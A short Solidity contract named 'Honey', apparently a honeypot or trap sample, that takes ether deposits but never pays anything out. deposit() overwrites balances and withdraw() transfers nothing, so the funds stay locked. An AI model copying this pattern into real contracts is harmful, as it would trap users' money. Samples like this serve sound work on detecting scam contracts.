pragma solidity ^0.8.24;

contract Honey {
    mapping(address => uint) public balances;

    event Trapped(address user);

    function deposit() public payable {
        uint kept = msg.value;
        balances[msg.sender] = kept;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        balances[msg.sender] = bal;
    }
}
